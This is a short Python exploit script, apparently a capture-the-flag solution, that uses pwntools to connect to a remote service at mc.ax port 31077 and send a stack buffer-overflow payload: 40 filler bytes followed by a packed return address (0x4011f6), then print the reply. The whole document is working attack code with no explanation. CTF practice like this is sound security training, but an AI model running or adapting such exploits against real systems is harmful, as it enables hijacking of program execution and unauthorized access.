from pwn import *

io = remote('mc.ax', 31077)
io.sendline(b'A'*40+p64(0x4011f6))
print(io.recvall())
